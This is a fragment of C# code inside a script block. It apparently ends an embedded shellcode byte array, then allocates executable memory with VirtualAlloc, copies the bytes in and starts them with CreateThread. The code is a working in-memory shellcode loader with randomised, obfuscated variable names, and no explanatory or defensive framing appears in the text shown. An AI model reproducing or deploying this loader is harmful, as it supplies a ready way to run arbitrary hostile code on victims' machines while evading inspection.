...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr uvUAp4D = VirtualAlloc(IntPtr.Zero,(UIntPtr)kmZUkY79aQh.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(kmZUkY79aQh,0,uvUAp4D,kmZUkY79aQh.Length);
        IntPtr cZiGr7d = IntPtr.Zero;
        IntPtr rZM57J = CreateThread(IntPtr.Zero,UIntPtr.Zero,uvUAp4D,IntPtr.Zero,0,ref cZiGr7d);
    }
</script>
